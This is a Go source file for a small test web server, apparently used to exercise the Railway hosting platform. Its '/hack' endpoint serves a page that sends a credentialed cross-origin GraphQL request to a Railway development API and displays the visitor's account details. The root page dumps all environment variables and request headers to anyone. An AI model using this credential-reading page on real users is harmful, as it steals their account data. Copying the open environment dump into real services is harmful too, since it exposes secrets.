package main

import (
	"fmt"
	"github.com/gorilla/websocket"
	"github.com/logrusorgru/aurora"
	"log"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"
)

var startTime = time.Now()
var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		origin := r.Header["Origin"]
		if len(origin) == 0 {
			return true
		}
		u, err := url.Parse(origin[0])
		if err != nil {
			return false
		}
		fmt.Printf("Testing %s ?= %s\n", u.Host, strings.TrimSuffix(r.Host, ":443"))
		return equalASCIIFold(u.Host, strings.TrimSuffix(r.Host, ":443"))
	},
}

func main() {
	fmt.Printf("%s %s %s %s %s %s %s %s\n", aurora.Black("  BLK  "), aurora.Red("  RED  "), aurora.Green("  GRN  "), aurora.Yellow("  YLW  "), aurora.Blue("  BLU  "), aurora.Magenta("  MGT  "), aurora.Cyan("  CYA  "), aurora.White("  WHT  "))
	fmt.Printf("%s %s %s %s %s %s %s %s\n", aurora.BrightBlack("  BLK  "), aurora.BrightRed("  RED  "), aurora.BrightGreen("  GRN  "), aurora.BrightYellow("  YLW  "), aurora.BrightBlue("  BLU  "), aurora.BrightMagenta("  MGT  "), aurora.BrightCyan("  CYA  "), aurora.BrightWhite("  WHT  "))
	fmt.Printf("%s %s %s %s %s %s %s %s\n", aurora.BgBlack("  BLK  "), aurora.BgRed("  RED  "), aurora.BgGreen("  GRN  "), aurora.BgYellow("  YLW  "), aurora.BgBlue("  BLU  "), aurora.BgMagenta("  MGT  "), aurora.BgCyan("  CYA  "), aurora.BgWhite("  WHT  "))
	fmt.Printf("%s %s %s %s %s %s %s %s\n", aurora.BgBrightBlack("  BLK  "), aurora.BgBrightRed("  RED  "), aurora.BgBrightGreen("  GRN  "), aurora.BgBrightYellow("  YLW  "), aurora.BgBrightBlue("  BLU  "), aurora.BgBrightMagenta("  MGT  "), aurora.BgBrightCyan("  CYA  "), aurora.BgBrightWhite("  WHT  "))

	port := os.Getenv("PORT")
	if port == "" {
		port = "3032"
	}

	if strings.ToLower(os.Getenv("ENABLE_TICK")) == "true" {
		go func() {
			ticks := 0
			for {
				ticks++
				fmt.Printf("This is number %s tick!\n", aurora.Magenta(fmt.Sprintf("%d", ticks)))
				<-time.Tick(time.Millisecond * 1000)
			}
		}()
	}

	http.HandleFunc("/timeout", func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(120 * time.Second)
		_, _ = w.Write([]byte("Woke up"))
	})

	http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	http.HandleFunc("/log", func(w http.ResponseWriter, r *http.Request) {
		log := r.URL.Query().Get("log")
		if log == "" {
			w.Header().Set("Content-Type", "text/html")
			w.Write([]byte(`<form method="GET"><input name="log" autofocus/><button type="submit">Log It!</button></form>`))
		} else {
			fmt.Println(log)
			http.Redirect(w, r, "/log", http.StatusSeeOther)
		}
	})

	http.HandleFunc("/printlogs", func(w http.ResponseWriter, r *http.Request) {
		n, err := strconv.Atoi(r.URL.Query().Get("lines"))
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			return
		}

		t := time.Now()
		fmt.Printf("%d INCOMING LOGS!\n", t.Unix())
		for i := 0; i < n; i++ {
			fmt.Printf("  %d Dummy log line %d\n", t.Unix(), i)
		}

		w.WriteHeader(http.StatusOK)
	})

	http.HandleFunc("/status", func(w http.ResponseWriter, r *http.Request) {
		status := r.URL.Query().Get("status")
		s, err := strconv.Atoi(status)
		if err == nil {
			w.WriteHeader(s)
		}
		_, _ = w.Write([]byte("Status=" + status))
	})

	http.HandleFunc("/hack", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		w.Write([]byte(`
		<h1>Hack</h1a
<code>
</code>
		<script>
(async function() {
const resp = await fetch("https://backboard.railway-develop.app/graphql?q=getMe", {
    "credentials": "include",
    "headers": {
        "Content-Type": "application/json",
    },
    "referrer": "https://railway-develop.app/",
    "body": "{\"query\":\"query getMe {\\n  me {\\n    ...UserFields\\n  }\\n}\\n\\nfragment UserFields on User {\\n  id\\n  email\\n  name\\n  avatar\\n  isAdmin\\n  createdAt\\n  plan\\n  agreedFairUse\\n  riskLevel\\n  customer {\\n    state\\n  }\\n  projects(orderBy: {updatedAt: desc}) {\\n    id\\n    name\\n    deletedAt\\n  }\\n  providerAuths {\\n    id\\n    provider\\n    metadata\\n  }\\n  banReason\\n  teams {\\n    ...TeamFields\\n  }\\n  resourceAccess {\\n    ...ResourceAccessFields\\n  }\\n}\\n\\nfragment TeamFields on Team {\\n  id\\n  name\\n  avatar\\n  createdAt\\n  customer {\\n    state\\n  }\\n  teamPermissions {\\n    id\\n    userId\\n    role\\n  }\\n  projects {\\n    id\\n    name\\n    deletedAt\\n  }\\n  resourceAccess {\\n    ...ResourceAccessFields\\n  }\\n}\\n\\nfragment ResourceAccessFields on ResourceAccess {\\n  project {\\n    allowed\\n    message\\n  }\\n  plugin {\\n    allowed\\n    message\\n  }\\n  environment {\\n    allowed\\n    message\\n  }\\n  deployment {\\n    allowed\\n    message\\n  }\\n}\\n\"}",
    "method": "POST",
    "mode": "cors"
});
document.querySelector('code').innerHTML = await resp.text();
})();
</script>
`))
	})

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(200)
		w.Header().Set("Content-Type", "text/html")
		w.Write([]byte("<style>body {color:#ccc;background:#222;font-family:sans-serif} td,th {text-align:left;padding-right:0.5rem}</style>"))
		w.Write([]byte(`
			<script>
				// Create WebSocket connection.
				const socket = new WebSocket(window.location.protocol.replace('http', 'ws')+'//'+window.location.host+'/websocket');

				// Connection opened
				socket.addEventListener('open', function (event) {
					socket.send('Hello Server!');
				});

				// Listen for messages
				socket.addEventListener('message', function (event) {
					console.log('Message from server ', event.data);
					document.querySelector('#ws-status').innerHTML = 'OK';
				});
			</script>
		`))
		w.Write([]byte("<h1>Railway App</h1>"))
		w.Write([]byte("<h2>Environment</h2>"))
		w.Write([]byte("<table><thead><tr><th>Variable</th><th>Value</th></tr></thead><tbody>"))
		env := os.Environ()
		sort.Slice(env, func(i, j int) bool {
			return strings.SplitN(env[i], "=", 2)[0] < strings.SplitN(env[j], "=", 2)[0]
		})
		for _, e := range env {
			s := strings.SplitN(e, "=", 2)
			fmt.Fprintf(w, "<tr><td>$%s</td><td>%s</td></tr>", s[0], s[1])
		}
		w.Write([]byte("</tbody></table>"))

		w.Write([]byte("<h2>Headers</h2>"))
		w.Write([]byte("<table><thead><tr><th>Header</th><th>Value</th></tr></thead><tbody>"))
		keys := make([]string, 0)
		for k := range r.Header {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		for _, k := range keys {
			fmt.Fprintf(w, "<tr><td>%s</td><td>%s</td></tr>", k, r.Header.Get(k))
		}
		w.Write([]byte("</tbody></table>"))
		w.Write([]byte("<h2>Websockets</h2>"))
		w.Write([]byte("<p id=\"ws-status\">Pending</p>"))
		w.Write([]byte("<p><small>Started " + startTime.Format(time.RFC1123Z) + "</small></p>"))
	})

	http.HandleFunc("/websocket", func(w http.ResponseWriter, r *http.Request) {
		// Upgrade our raw HTTP connection to a websocket based one
		conn, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			fmt.Print("Error during connection upgradation:", err)
			return
		}
		defer conn.Close()

		// The event loop
		for {
			messageType, message, err := conn.ReadMessage()
			if err != nil {
				fmt.Println("Error during message reading:", err)
				break
			}
			fmt.Printf("Received: %s", message)
			err = conn.WriteMessage(messageType, message)
			if err != nil {
				fmt.Println("Error during message writing:", err)
				break
			}
		}
	})

	fmt.Println("Starting server on port " + port + " at " + time.Now().Format(time.RFC3339))
	fmt.Printf("PROCESS ARGUMENTS %#v\n", os.Args)
	log.Fatal(http.ListenAndServe(":"+port, nil))
}

// equalASCIIFold returns true if s is equal to t with ASCII case folding as
// defined in RFC 4790.
func equalASCIIFold(s, t string) bool {
	for s != "" && t != "" {
		sr, size := utf8.DecodeRuneInString(s)
		s = s[size:]
		tr, size := utf8.DecodeRuneInString(t)
		t = t[size:]
		if sr == tr {
			continue
		}
		if 'A' <= sr && sr <= 'Z' {
			sr = sr + 'a' - 'A'
		}
		if 'A' <= tr && tr <= 'Z' {
			tr = tr + 'a' - 'A'
		}
		if sr != tr {
			return false
		}
	}
	return s == t
}
